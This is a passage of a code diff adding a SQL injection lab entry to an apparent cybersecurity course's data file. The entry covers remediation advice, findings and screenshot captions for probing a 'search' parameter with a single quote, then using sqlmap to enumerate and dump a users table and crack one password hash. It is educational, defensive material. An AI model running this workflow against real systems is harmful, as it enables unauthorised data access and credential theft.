+      "Use parameterized queries (prepared statements) everywhere, which closes this class of bug completely regardless of input. Apply least-privilege to the database account so the web app cannot read information_schema or unrelated tables. Store passwords with a slow salted hash (bcrypt/argon2), not the fast hashes seen here, and return generic error pages so a 1064 never reaches the client. Add WAF coverage and alerting for injection patterns, and test every parameter, since only one of two was vulnerable here.",
+    securityControlsRelevant: [
+      "Parameterized queries / prepared statements",
+      "Least-privilege database account",
+      "Slow salted password hashing (bcrypt/argon2)",
+      "Generic error handling (no SQL errors to the client)",
+      "Per-parameter injection testing and WAF coverage",
+    ],
+    keyFindings: [
+      "A single quote in 'search' returned a MariaDB 1064 error (manual confirmation)",
+      "sqlmap found 'search' injectable via 4 techniques; 'entityid' was not injectable",
+      "Enumerated support DB tables: chat, contact, kb, tickets, users",
+      "--dump recovered 12 users with roles (sme/admin/audit) and password hashes",
+      "sqlmap cracked one hash inline to Password123",
+    ],
+    takeaway: [
+      "One character confirmed the whole finding. A single quote that produces a 1064 error tells you the input reaches the query unescaped and that the backend is MariaDB, before any automated tool runs. That manual step matters: it validates the vulnerability, guides sqlmap, and in a report it is far more convincing than 'the scanner said so.' Parameterized queries would make that single quote inert, which is the entire fix.",
+      "Parameter-level testing is the operational lesson. The endpoint had two parameters and only one was injectable; assuming the URL was uniformly safe or unsafe would have been wrong either way. sqlmap tested each and reported which, and that granularity is exactly how injection review has to work, because a single unparameterized parameter among many is all it takes to expose the whole database.",
+    ],
+    screenshots: [
+      { src: "/labs/sql-injection-120418.png", alt: "manual single-quote probe", caption: "search=RAG' returns a MariaDB 1064 syntax error" },
+      { src: "/labs/sql-injection-120708.png", alt: "sqlmap start", caption: "sqlmap 1.5.2 begins testing the parameters" },
+      { src: "/labs/sql-injection-120819.png", alt: "injection techniques", caption: "'search' injectable via boolean, error, time-based, and UNION" },
+      { src: "/labs/sql-injection-121227.png", alt: "--dbs run", caption: "sqlmap resumes the stored session and enumerates databases" },
+      { src: "/labs/sql-injection-121236.png", alt: "databases", caption: "Available databases: information_schema, support" },
+      { src: "/labs/sql-injection-121343.png", alt: "--tables run", caption: "Enumerating tables in the support database" },
+      { src: "/labs/sql-injection-121356.png", alt: "tables list", caption: "Tables: chat, contact, kb, tickets, users" },
+      { src: "/labs/sql-injection-121544.png", alt: "--dump run", caption: "Dumping the users table; hashes recognized in the password column" },
+      { src: "/labs/sql-injection-121638.png", alt: "users dump", caption: "12 users with roles (sme/admin/audit) and hashes; one cracked to Password123" },
+    ],
+  },
 ];
 
 export function getLabByCourseAndSlug(courseSlug: string, slug: string): CybersecurityLab | undefined {
